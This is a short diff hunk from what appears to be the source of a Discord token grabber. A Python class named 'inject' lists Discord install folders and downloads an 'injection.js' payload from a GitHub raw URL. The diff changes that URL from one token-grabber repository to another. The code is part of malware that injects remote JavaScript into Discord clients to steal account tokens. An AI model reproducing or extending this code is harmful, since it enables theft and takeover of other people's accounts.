@@ -268,7 +268,7 @@ class inject:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = get("https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
+        self.code = get("https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/injection.js").text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
